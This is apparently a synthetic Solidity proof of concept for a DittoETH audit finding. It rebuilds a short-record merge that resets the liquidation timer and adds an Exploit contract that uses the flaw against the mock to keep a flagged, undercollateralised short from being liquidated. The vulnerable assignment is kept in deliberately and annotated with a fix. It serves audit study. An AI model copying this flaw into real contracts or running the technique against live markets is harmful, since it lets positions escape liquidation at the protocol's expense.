// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  DittoETH — last short record dodges primary liquidation (CodeHawks #27450)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: when every short-record id is used, fillShortRecord merges the
    new fill into id 254 and LibShortRecord.merge writes updatedAt = now.
    A flagged short that is still under primaryLiquidationCR (but above
    minimumCR) is pushed out of the liquidation window, so liquidate reverts
    MarginCallIneligibleWindow and the collateral stays.
    The blamed assignment is preserved verbatim (@> VULN).
    Clock is LibOrders.getOffsetTimeHours (hours since Constants.STARTING_TIME).
    One block: the 11-hour flag age is the seeded updatedAt, not a warp inside run(). */

library DittoMath {
    function mul(uint88 x, uint256 y) internal pure returns (uint256) {
        return uint256(x) * y;
    }

    function divU64(uint256 x, uint256 y) internal pure returns (uint64) {
        return uint64(x / y);
    }

    function divU80(uint256 x, uint256 y) internal pure returns (uint80) {
        return uint80(x / y);
    }
}

contract Zeth {
    string public name = "zETH";
    string public symbol = "zETH";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public immutable minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

enum SR {
    PartialFill,
    FullyFilled,
    Cancelled
}

contract ShortBook {
    using DittoMath for uint88;
    using DittoMath for uint256;

    uint8 internal constant SHORT_MAX_ID = 254;
    uint256 internal constant STARTING_TIME = 1_660_353_637;
    uint256 public constant PRIMARY_LIQUIDATION_CR = 1.5 ether;
    uint256 public constant MINIMUM_CR = 1.1 ether;
    uint256 internal constant FIRST_LIQUIDATION_HOURS = 10;
    uint256 internal constant SECOND_LIQUIDATION_HOURS = 12;
    uint256 internal constant RESET_LIQUIDATION_HOURS = 16;
    uint24 internal constant FLAG_AGE_HOURS = 11;

    struct ShortRecord {
        SR status;
        uint88 collateral;
        uint88 ercDebt;
        uint64 ercDebtRate;
        uint80 zethYieldRate;
        uint16 flaggerId;
        uint24 updatedAt;
    }

    Zeth public immutable zeth;
    address public immutable shorter;
    address public liquidator;
    uint8 public nextShortId = 255;
    mapping(uint8 => ShortRecord) public shorts;
    mapping(uint16 => address) public flaggerOf;

    error CannotLiquidateSelf();
    error SufficientCollateral();
    error ShortNotFlagged();
    error MarginCallIneligibleWindow();

    constructor(Zeth _zeth, address _shorter) {
        zeth = _zeth;
        shorter = _shorter;
    }

    function setLiquidator(address who) external {
        require(msg.sender == shorter, "shorter");
        liquidator = who;
    }

    function getOffsetTime() internal view returns (uint32 timeInSeconds) {
        return uint32(block.timestamp - STARTING_TIME);
    }

    function getOffsetTimeHours() internal view returns (uint24 timeInHours) {
        return uint24(getOffsetTime() / 1 hours);
    }

    function hoursNow() external view returns (uint24) {
        return getOffsetTimeHours();
    }

    function collateralOf(uint8 id) external view returns (uint88) {
        return shorts[id].collateral;
    }

    function updatedAtOf(uint8 id) external view returns (uint24) {
        return shorts[id].updatedAt;
    }

    function ercDebtOf(uint8 id) external view returns (uint88) {
        return shorts[id].ercDebt;
    }

    function cRatioOf(uint8 id) external view returns (uint256) {
        return _cRatio(shorts[id]);
    }

    function _cRatio(ShortRecord memory short) internal pure returns (uint256) {
        return uint256(short.collateral) * 1 ether / uint256(short.ercDebt);
    }

    /// Precondition: short was flagged FLAG_AGE_HOURS ago and is still inside
    /// (firstLiquidationTime, secondLiquidationTime]. Not the bug.
    function openFlaggedShort(uint8 id, uint88 collateral, uint88 ercDebt) external {
        require(msg.sender == shorter, "shorter");
        require(id != 0 && ercDebt != 0, "id");
        zeth.transferFrom(msg.sender, address(this), collateral);
        ShortRecord storage short = shorts[id];
        short.status = SR.FullyFilled;
        short.collateral = collateral;
        short.ercDebt = ercDebt;
        short.ercDebtRate = 0;
        short.zethYieldRate = 0;
        short.flaggerId = 1;
        flaggerOf[1] = liquidator;
        uint24 openedAt = getOffsetTimeHours() - FLAG_AGE_HOURS;
        short.updatedAt = openedAt;
    }

    function createShortRecord(
        SR status,
        uint88 collateral,
        uint88 ercAmount,
        uint256 ercDebtRate,
        uint256 zethYieldRate
    ) external returns (uint8 id) {
        require(msg.sender == shorter, "shorter");
        uint8 candidate = nextShortId;
        if (candidate <= SHORT_MAX_ID) {
            id = candidate;
            nextShortId = candidate + 1;
            ShortRecord storage fresh = shorts[id];
            fresh.status = status;
            fresh.collateral = collateral;
            fresh.ercDebt = ercAmount;
        } else {
            // All shortRecordIds used, combine into max shortRecordId
            id = SHORT_MAX_ID;
            fillShortRecord(
                address(zeth), shorter, id, status, collateral, ercAmount, ercDebtRate, zethYieldRate
            );
        }
    }

    function fillShortRecord(
        address asset,
        address shorter_,
        uint8 shortId,
        SR status,
        uint88 collateral,
        uint88 ercAmount,
        uint256 ercDebtRate,
        uint256 zethYieldRate
    ) internal {
        uint256 ercDebtSocialized = ercAmount.mul(ercDebtRate);
        uint256 yield = collateral.mul(zethYieldRate);

        ShortRecord storage short = shorts[shortId];
        if (short.status == SR.Cancelled) {
            short.ercDebt = short.collateral = 0;
        }

        short.status = status;
        merge(short, ercAmount, ercDebtSocialized, collateral, yield, getOffsetTimeHours());
    }

    function merge(
        ShortRecord storage short,
        uint88 ercDebt,
        uint256 ercDebtSocialized,
        uint88 collateral,
        uint256 yield,
        uint24 creationTime
    ) internal {
        // Resolve ercDebt
        ercDebtSocialized += short.ercDebt.mul(uint256(short.ercDebtRate));
        short.ercDebt += ercDebt;
        short.ercDebtRate = ercDebtSocialized.divU64(short.ercDebt);
        // Resolve zethCollateral
        yield += short.collateral.mul(uint256(short.zethYieldRate));
        short.collateral += collateral;
        short.zethYieldRate = yield.divU80(short.collateral);
        // Assign updatedAt
        // @> VULN: merging into the last short record sets updatedAt to now, so a flagged underwater short leaves the liquidation window
        // FIX: if the short is flagged and the post-merge c-ratio is still under primaryLiquidationCR, revert instead of refreshing updatedAt
        short.updatedAt = creationTime;
    }

    function liquidate(uint8 id) external returns (uint88 seized) {
        if (msg.sender == shorter) revert CannotLiquidateSelf();
        ShortRecord storage stored = shorts[id];
        ShortRecord memory short = stored;
        uint256 cRatio = _cRatio(short);
        if (cRatio >= PRIMARY_LIQUIDATION_CR) revert SufficientCollateral();
        if (!_canLiquidate(short)) {
            stored.flaggerId = 0;
            stored.updatedAt = getOffsetTimeHours();
            return 0;
        }
        seized = stored.collateral;
        stored.collateral = 0;
        stored.ercDebt = 0;
        stored.flaggerId = 0;
        zeth.transfer(msg.sender, seized);
    }

    function _canLiquidate(ShortRecord memory short) private view returns (bool) {
        if (_cRatio(short) < MINIMUM_CR) return true;
        if (short.flaggerId == 0) revert ShortNotFlagged();

        uint256 timeDiff = getOffsetTimeHours() - short.updatedAt;
        uint256 resetLiquidationTime = RESET_LIQUIDATION_HOURS;

        if (timeDiff >= resetLiquidationTime) {
            return false;
        } else {
            uint256 secondLiquidationTime = SECOND_LIQUIDATION_HOURS;
            bool isBetweenFirstAndSecondLiquidationTime = timeDiff > FIRST_LIQUIDATION_HOURS
                && timeDiff <= secondLiquidationTime && flaggerOf[short.flaggerId] == msg.sender;
            bool isBetweenSecondAndResetLiquidationTime =
                timeDiff > secondLiquidationTime && timeDiff <= resetLiquidationTime;
            if (!(isBetweenFirstAndSecondLiquidationTime || isBetweenSecondAndResetLiquidationTime)) {
                revert MarginCallIneligibleWindow();
            }
            return true;
        }
    }
}

contract Liquidator {
    ShortBook public immutable book;

    constructor(ShortBook _book) {
        book = _book;
    }

    function liquidate(uint8 id) external returns (uint88 seized) {
        seized = book.liquidate(id);
    }
}

contract Exploit {
    uint8 public constant LAST = 254;
    uint8 public constant CONTROL = 2;
    uint88 public constant COLLATERAL = 1_200 ether;
    uint88 public constant DEBT = 1_000 ether;

    Zeth public zeth;
    ShortBook public book;
    Liquidator public liq;
    uint256 public stayedCollateral;
    uint256 public controlSeized;
    bool public lastLiquidationBlocked;

    constructor() {
        zeth = new Zeth();
        book = new ShortBook(zeth, address(this));
        liq = new Liquidator(book);
        book.setLiquidator(address(liq));
        zeth.mint(address(this), uint256(COLLATERAL) * 2);
    }

    function run() external {
        zeth.approve(address(book), uint256(COLLATERAL) * 2);
        book.openFlaggedShort(LAST, COLLATERAL, DEBT);
        book.openFlaggedShort(CONTROL, COLLATERAL, DEBT);
        uint24 age = book.hoursNow() - book.updatedAtOf(LAST);
        require(age == 11, "last short not inside the flag window");
        uint8 id = book.createShortRecord(SR.FullyFilled, 0, 1, 0, 0);
        require(id == LAST, "dust fill did not merge into the last record");
        lastLiquidationBlocked = _liquidateReverts(LAST);
        stayedCollateral = book.collateralOf(LAST);
        require(lastLiquidationBlocked, "last short was liquidated");
        require(stayedCollateral == COLLATERAL, "underwater collateral did not stay");
        require(book.cRatioOf(LAST) < book.PRIMARY_LIQUIDATION_CR(), "last short is not underwater");
        require(book.cRatioOf(LAST) > book.MINIMUM_CR(), "minimumCR bypass would have liquidated");
        controlSeized = liq.liquidate(CONTROL);
        require(book.collateralOf(CONTROL) == 0, "control short was not liquidated");
        require(controlSeized == COLLATERAL, "control collateral was not seized");
        require(zeth.balanceOf(address(book)) == COLLATERAL, "market did not keep the stayed collateral");
    }

    /// Same flagged last short, no merge. The window is still open, so it liquidates.
    function runControl() external {
        zeth.approve(address(book), COLLATERAL);
        book.openFlaggedShort(LAST, COLLATERAL, DEBT);
        uint88 seized = liq.liquidate(LAST);
        require(seized == COLLATERAL, "control did not seize the last short");
        require(book.collateralOf(LAST) == 0, "last short collateral stayed without a merge");
    }

    function _liquidateReverts(uint8 id) internal returns (bool blocked) {
        try liq.liquidate(id) returns (uint88) {
            blocked = false;
        } catch {
            blocked = true;
        }
    }
}
